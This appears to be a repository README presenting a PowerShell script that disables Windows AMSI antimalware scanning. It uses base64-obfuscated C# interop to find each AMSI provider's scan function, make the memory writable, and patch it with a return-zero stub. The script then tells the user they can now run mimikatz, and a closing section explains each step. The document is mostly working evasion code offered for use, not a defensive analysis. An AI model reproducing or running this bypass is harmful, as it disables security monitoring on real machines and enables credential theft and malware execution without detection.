## Overview

This repository houses a PowerShell script engineered to circumvent the AMSI. AMSI serves as a security feature, allowing integration with antivirus and antimalware products to bolster threat protection. 

## Script
```pwsh
$g = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIEFwaXMgew0KICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KICBbRGxsSW1wb3J0KCJhbXNpIildDQogIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBBbXNpSW5pdGlhbGl6ZShzdHJpbmcgYXBwTmFtZSwgb3V0IEludDY0IGNvbnRleHQpOw0KfQ=='))

Add-Type $g

$r = [Convert]::FromBase64String('uLgA/wDD')
$y = 0; $i = 0
$SIZE_OF_PTR = 8
[Int64]$z = 0

# Initializing AMSI
try {
    [Apis]::AmsiInitialize("MyScanner", [ref]$z)
    Write-Host "AMSI initialized successfully. Context: $z"

    # Retrieve pointers for AMSI providers
    $b = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$z, 16)
    Write-Host "Providers pointer: $b"

    $c = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$b, 64)
    Write-Host "Initial provider pointer: $c"
} catch {
    Write-Host "Error during AMSI initialization or pointer retrieval: $_"
    exit 1
}

# Iterate through AMSI providers
try {
    while ($c -ne 0) {
        $d = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$c)
        $e = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$d, 24)
        Write-Host "[$i] Provider's scan function found at address: $e"

        if (![Apis]::VirtualProtect($e, [uint32]6, 0x40, [ref]$y)) {
            throw "Failed to change memory protection at address: $e"
        }

        [System.Runtime.InteropServices.Marshal]::Copy($r, 0, [IntPtr]$e, 6)
        Write-Host "[$i] Scan function patched successfully."

        $i++
        $c = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$b, 64 + ($i * $SIZE_OF_PTR))
    }
    Write-Host "Patching completed successfully."
    Write-Host "You can Invoke mimikatz now (: "
} catch {
    Write-Host "Error during provider iteration and patching: $_"
    exit 1
}
```



## Script Approach
***Initializing AMSI and Retrieving Pointers***: The script starts by setting up AMSI and getting pointers, which are like signposts pointing to important parts of AMSI.

***Finding Scan Functions***: It then looks through these pointers to find where AMSI does its scanning work, kind of like finding where a detective does their investigation.

***Patching Scan Functions with RET 0***: When it finds these scanning spots, the script changes them so that when they're called, they immediately stop and say "everything's okay." This makes the scans skip right over any potentially harmful stuff.

***Changing Memory Access***: Before making these changes, the script adjusts the way the computer sees these scanning spots so it can make changes to them, kind of like getting permission to edit a document.

***Covering All Bases***: The script repeats these steps for every way AMSI does its scanning, ensuring that no matter how AMSI checks for bad stuff, the script can sneak past it.
